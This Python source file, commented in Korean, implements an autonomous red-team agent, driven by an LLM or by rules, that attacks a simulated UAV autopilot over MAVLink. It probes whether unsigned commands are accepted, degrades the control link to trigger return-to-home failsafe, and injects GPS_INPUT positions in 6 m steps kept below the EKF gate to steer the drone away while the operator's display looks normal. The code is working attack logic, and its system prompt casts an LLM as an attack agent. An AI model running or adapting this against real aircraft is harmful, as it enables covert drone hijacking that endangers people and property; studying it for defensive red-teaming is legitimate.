"""
red_agent — 자율 공격 에이전트 (트랙 B), 실물 MAVLink 위에서 동작.

그레이박스: 공개 규약(mavproto)·중립 수학(geo)만 안다. 방어 정책(policy)은 모른다 →
서버 응답(COMMAND_ACK, 텔레메트리)을 관찰해 방어를 경험적으로 추론한다.

공격 체인(그린보드 하이재킹 ②, 정본):
  1) 정찰       : HEARTBEAT/텔레메트리 수신 → 표적 sys/comp·모드 파악.
  2) 인증 프로브 : 미서명 COMMAND_LONG 1발 → COMMAND_ACK 로 서명강제 여부 추론.
  3) 링크 열화   : C2 링크를 흔들어 페일세이프(RTL)를 유도(RF 계층 = 환경효과, 제어평면 경유).
  4) 스텔스 스푸핑: RTL 항법이 믿는 EKF 위치추정을, GLOBAL_POSITION_INT 근처로 조금씩 편이한
                  GPS_INPUT 반복 주입으로 게이트 아래에서 누적 편이 → RTL 이 엉뚱한 곳으로.
  5) 종료       : 오퍼레이터 화면·페일세이프는 정상(그린보드)인 채 기체만 오유도.

브레인 2종(하네스는 provider 를 모른다 — common.llm 어댑터):
  - LLMBrain     : LLM(Groq 등 OpenAI 호환)이 다음 행동을 스스로 결정 (LLM_API_KEY 필요)
  - HeuristicBrain: 규칙기반(키 불필요) — 어느 환경에서든 루프가 실제로 돈다(에어갭 검증)

실행:
  cd src && LLM_API_KEY=gsk_... ../.venv/bin/python -m red_agent.agent   # Groq LLM 브레인
  cd src && ../.venv/bin/python -m red_agent.agent --brain heuristic     # 키 없이
"""
from __future__ import annotations

import argparse
import json
import os
import time
from pathlib import Path
from typing import Any, Optional

import httpx

import mavproto  # MAVLINK20 활성 + 공개 규약
from mavproto.dialect import mavlink, ids
from mavproto.link import connect_agent
from common.geo import offset_m
from common.wire import now_ts, Position
from common.llm import make_client, tool_result_message, ToolCall

HOST = os.environ.get("RED_HOST", "127.0.0.1")
PORT = int(os.environ.get("RED_MAV_PORT", "14550"))
CONTROL_URL = os.environ.get("RED_CONTROL_URL", "http://127.0.0.1:8137")
RED_LOG = os.environ.get("RED_LOG", "logs/red_agent.log")
GOAL = ("오퍼레이터 화면·페일세이프는 정상(그린보드)으로 유지한 채, 링크를 흔들어 페일세이프"
        "(RTL)를 유도한 뒤 GPS_INPUT 을 게이트 아래로 조금씩 주입해 EKF 위치추정을 편이시켜 "
        "RTL 항법을 오유도하라. 명시적 하이재킹 명령·급격한 스푸핑은 피하라.")

SPOOF_STEP_M = 6.0            # 매 주입당 편이 증분(EKF 게이트 12m 아래 = 스텔스)
SPOOF_BEARING = (0.0, -1.0)  # (북,동) 단위벡터: 서쪽으로 끌기
CUSTOM_MODE_RTL = 6          # ArduCopter RTL


def log_step(kind: str, content: str) -> None:
    line = f"[{now_ts()}] {kind}: {content}"
    print(line, flush=True)
    p = Path(RED_LOG)
    p.parent.mkdir(parents=True, exist_ok=True)
    with p.open("a", encoding="utf-8") as f:
        f.write(line + "\n")


# ─────────────────────────── MAVLink 클라이언트 + 공격 툴 ───────────────────────────
class Tools:
    def __init__(self, host: str, port: int, control_url: str):
        self.conn = connect_agent(host, port, me=ids.red, secret_key=None)  # 키 없음 → 미서명
        self.conn.mav.heartbeat_send(mavlink.MAV_TYPE_GCS, mavlink.MAV_AUTOPILOT_INVALID, 0, 0, 0)
        self.control_url = control_url
        self._latest: dict[str, Any] = {}
        self.cum_n = 0.0
        self.cum_e = 0.0

    def _pump(self, dur_s: float = 0.4) -> None:
        t0 = time.monotonic()
        while time.monotonic() - t0 < dur_s:
            msg = self.conn.recv_match(blocking=True, timeout=0.2)
            if msg is None:
                continue
            self._latest[msg.get_type()] = msg

    def _reported_pos(self) -> Optional[Position]:
        g = self._latest.get("GLOBAL_POSITION_INT")
        if g is None:
            return None
        return Position(lat=g.lat / 1e7, lon=g.lon / 1e7, alt_m=g.alt / 1000.0)

    def recon_scan(self) -> dict:
        self._pump(1.2)
        hb = self._latest.get("HEARTBEAT")
        return {"vehicle_seen": hb is not None,
                "vehicle_system": hb.get_srcSystem() if hb else None,
                "custom_mode": hb.custom_mode if hb else None,
                "message_types": sorted(self._latest.keys())}

    def read_telemetry(self) -> dict:
        self._pump(0.5)
        g = self._latest.get("GLOBAL_POSITION_INT")
        ekf = self._latest.get("EKF_STATUS_REPORT")
        hb = self._latest.get("HEARTBEAT")
        mode = hb.custom_mode if hb else None
        return {"reported_position": ({"lat": g.lat / 1e7, "lon": g.lon / 1e7} if g else None),
                "ekf_pos_horiz_var": (round(ekf.pos_horiz_variance, 3) if ekf else None),
                "custom_mode": mode, "in_rtl": mode == CUSTOM_MODE_RTL}

    def probe_auth(self) -> dict:
        req_msg_cmd = 512  # MAV_CMD_REQUEST_MESSAGE (무해 — 상태변경 아님)
        self.conn.mav.command_long_send(ids.vehicle.system, ids.vehicle.component,
                                        req_msg_cmd, 0, 0, 0, 0, 0, 0, 0, 0)
        deadline = time.monotonic() + 2.0
        while time.monotonic() < deadline:
            ack = self.conn.recv_match(type="COMMAND_ACK", blocking=True, timeout=0.4)
            if ack and ack.command == req_msg_cmd:
                accepted = ack.result == mavlink.MAV_RESULT_ACCEPTED
                return {"accepted": accepted, "result": int(ack.result),
                        "inferred_signing_enforced": not accepted}
            self._pump(0.1)
        return {"accepted": None, "inferred_signing_enforced": None, "note": "ACK 미수신"}

    def degrade_link(self, quality: float = 0.1, hold_s: float = 8.0) -> dict:
        """C2 링크 열화(RF 잼) → 페일세이프(RTL) 유도. RF 는 프로토콜 메시지가 아니라
        환경효과이므로 제어평면 경유(정직한 추상화)."""
        try:
            httpx.post(f"{self.control_url}/api/_env/link_degrade",
                       params={"quality": quality, "hold_s": hold_s}, timeout=3)
            return {"link_degraded": True, "quality": quality, "hold_s": hold_s}
        except Exception as e:  # noqa: BLE001
            return {"link_degraded": False, "error": str(e)}

    def spoof_gps_step(self, steps: int = 1) -> dict:
        applied = 0
        for _ in range(max(1, steps)):
            self._pump(0.3)
            base = self._reported_pos()
            if base is None:
                continue
            self.cum_n += SPOOF_STEP_M * SPOOF_BEARING[0]
            self.cum_e += SPOOF_STEP_M * SPOOF_BEARING[1]
            inj = offset_m(base, SPOOF_STEP_M * SPOOF_BEARING[0], SPOOF_STEP_M * SPOOF_BEARING[1])
            self._send_gps_input(inj)
            applied += 1
        return {"injections": applied,
                "cumulative_offset_m": {"north": round(self.cum_n, 1), "east": round(self.cum_e, 1)}}

    def _send_gps_input(self, p: Position) -> None:
        ignore = (mavlink.GPS_INPUT_IGNORE_FLAG_VEL_HORIZ |
                  mavlink.GPS_INPUT_IGNORE_FLAG_VEL_VERT |
                  mavlink.GPS_INPUT_IGNORE_FLAG_SPEED_ACCURACY |
                  mavlink.GPS_INPUT_IGNORE_FLAG_HORIZONTAL_ACCURACY |
                  mavlink.GPS_INPUT_IGNORE_FLAG_VERTICAL_ACCURACY)
        self.conn.mav.gps_input_send(
            int(time.time() * 1e6), 0, ignore, 0, 0,
            mavlink.GPS_FIX_TYPE_3D_FIX, int(p.lat * 1e7), int(p.lon * 1e7), p.alt_m,
            0.7, 0.7, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 12, 0)


TOOL_SCHEMAS = [
    {"name": "recon_scan", "description": "표적 MAVLink 스트림을 수신해 기체·모드·메시지 종류를 파악(정찰).",
     "input_schema": {"type": "object", "properties": {}}},
    {"name": "read_telemetry", "description": "현재 보고위치·EKF 분산·모드(in_rtl 포함)를 읽는다.",
     "input_schema": {"type": "object", "properties": {}}},
    {"name": "probe_auth", "description": "미서명 명령 1발을 보내 COMMAND_ACK 로 서명강제 여부를 추론.",
     "input_schema": {"type": "object", "properties": {}}},
    {"name": "degrade_link", "description": "C2 링크를 열화시켜 페일세이프(RTL)를 유도한다.",
     "input_schema": {"type": "object", "properties": {
         "quality": {"type": "number"}, "hold_s": {"type": "number"}}}},
    {"name": "spoof_gps_step", "description": "GPS_INPUT 을 보고위치 근처로 조금씩 편이 주입(스텔스 램프). steps 회.",
     "input_schema": {"type": "object", "properties": {"steps": {"type": "integer"}}}},
    {"name": "conclude", "description": "임무 종료. success 와 요약.",
     "input_schema": {"type": "object", "properties": {
         "success": {"type": "boolean"}, "summary": {"type": "string"}}, "required": ["success"]}},
]


def run_tool(tools: Tools, name: str, args: dict) -> dict:
    if name == "conclude":
        return {"done": True, **args}
    fn = getattr(tools, name, None)
    if fn is None:
        return {"error": f"unknown tool {name}"}
    try:
        return fn(**(args or {}))
    except Exception as e:  # noqa: BLE001
        return {"error": str(e)}


# ─────────────────────────── 휴리스틱 브레인 (키 불필요) ───────────────────────────
class HeuristicBrain:
    """규칙기반 ReAct — LLM 없이도 관측→추론→행동 루프가 실제로 돈다."""
    def __init__(self, spoof_bursts: int = 8):
        self.step = 0
        self.waited = 0
        self.spoof_bursts = spoof_bursts
        self.done_bursts = 0

    def decide(self, last_obs: Optional[dict]) -> tuple[str, str, dict]:
        s = self.step
        if s == 0:
            self.step += 1
            return ("표적 MAVLink 스트림을 정찰한다.", "recon_scan", {})
        if s == 1:
            self.step += 1
            return ("미서명 명령이 통하는지(서명강제 여부) 프로브한다.", "probe_auth", {})
        if s == 2:
            self.step += 1
            return ("직접 하이재킹 대신 링크를 흔들어 페일세이프(RTL)를 유도한다.",
                    "degrade_link", {"quality": 0.1, "hold_s": 10})
        if s == 3:
            # 페일세이프(RTL) 트립 대기
            if last_obs and last_obs.get("in_rtl"):
                self.step += 1
                return ("RTL 확인. 이제 GPS_INPUT 을 게이트 아래로 주입해 RTL 항법을 편이시킨다.",
                        "spoof_gps_step", {"steps": 5})
            self.waited += 1
            if self.waited > 15:  # 안전 상한 — 안 뜨면 그냥 스푸핑 진행
                self.step += 1
                return ("RTL 지연 — 스텔스 스푸핑을 개시한다.", "spoof_gps_step", {"steps": 5})
            return ("아직 RTL 전. 상태를 다시 관측하며 기다린다.", "read_telemetry", {})
        if s == 4:
            if self.done_bursts < self.spoof_bursts:
                self.done_bursts += 1
                return (f"GPS_INPUT 스텔스 램프 계속({self.done_bursts}/{self.spoof_bursts}).",
                        "spoof_gps_step", {"steps": 5})
            self.step += 1
            return ("스푸핑 누적 효과를 확인한다.", "read_telemetry", {})
        return ("링크 열화→페일세이프→스텔스 GPS 편이 완료. 오퍼레이터는 그린보드.", "conclude",
                {"success": True, "summary": "그린보드 하이재킹: 링크열화로 RTL 유도 후 GPS_INPUT 스텔스 램프로 EKF 편이."})


# ─────────────────────────── LLM 브레인 (provider-agnostic) ───────────────────────────
class LLMBrain:
    """LLM(Groq 등 OpenAI 호환)이 tool_calls 로 다음 행동을 스스로 결정 (수동 에이전트 루프)."""
    def __init__(self, client):
        self.client = client
        self.messages: list[dict] = [
            {"role": "system", "content":
                "너는 UAV 레드팀 자율 공격 에이전트다. 한 번에 하나의 툴만 호출하고, 관측을 보고 "
                "다음 행동을 정하라. 서버 응답(ACK·텔레메트리)으로 방어를 추론하라."},
            {"role": "user", "content":
                f"목표: {GOAL}\n표적은 {HOST}:{PORT} 의 UAV 오토파일럿(MAVLink 2.0)이다. "
                "정찰→인증프로브→링크열화로 RTL 유도→GPS_INPUT 을 게이트 아래로 여러 번 조금씩 "
                "주입(EKF 분산이 커지지 않게)→편이 누적. 끝나면 conclude 를 호출하라."}]
        self._pending: Optional[ToolCall] = None

    def decide(self, last_obs: Optional[dict]) -> tuple[str, str, dict]:
        if last_obs is not None and self._pending is not None:
            self.messages.append(tool_result_message(self._pending, last_obs))
        result = self.client.complete(self.messages, TOOL_SCHEMAS)
        # 다중 tool_call 방지: 첫 호출만 실행·이력화(OpenAI 는 미응답 tool_call 을 다음 턴에 요구).
        if result.tool_calls:
            first = result.tool_calls[0]
            am = dict(result.assistant_message)
            if "tool_calls" in am:
                am["tool_calls"] = am["tool_calls"][:1]
            self.messages.append(am)
            self._pending = first
            return (result.text or f"{first.name} 실행", first.name, first.arguments)
        self.messages.append(result.assistant_message or {"role": "assistant", "content": result.text})
        return (result.text or "종료.", "conclude", {"success": True, "summary": result.text})


# ─────────────────────────── 에이전트 루프 ───────────────────────────
def run(brain_kind: str = "auto", max_steps: int = 24) -> None:
    client = make_client()
    if brain_kind == "auto":
        brain_kind = "llm" if client else "heuristic"
    if brain_kind == "llm" and client is None:
        log_step("WARN", "LLM 키 없음 → heuristic 폴백")
        brain_kind = "heuristic"
    brain = LLMBrain(client) if brain_kind == "llm" else HeuristicBrain()
    tools = Tools(HOST, PORT, CONTROL_URL)
    log_step("START", f"target={HOST}:{PORT} brain={brain_kind} goal={GOAL}")

    last_obs: Optional[dict] = None
    for _ in range(max_steps):
        thought, action, args = brain.decide(last_obs)
        log_step("THOUGHT", thought)
        log_step("ACTION", f"{action} {json.dumps(args, ensure_ascii=False)}")
        obs = run_tool(tools, action, args)
        last_obs = obs
        log_step("OBSERVATION", json.dumps(obs, ensure_ascii=False))
        if action == "conclude" or obs.get("done"):
            log_step("END", f"success={obs.get('success')}")
            return
        time.sleep(0.3)
    log_step("END", "max_steps 도달")


if __name__ == "__main__":
    ap = argparse.ArgumentParser()
    ap.add_argument("--brain", choices=["auto", "llm", "heuristic"], default="auto")
    args = ap.parse_args()
    run(args.brain)
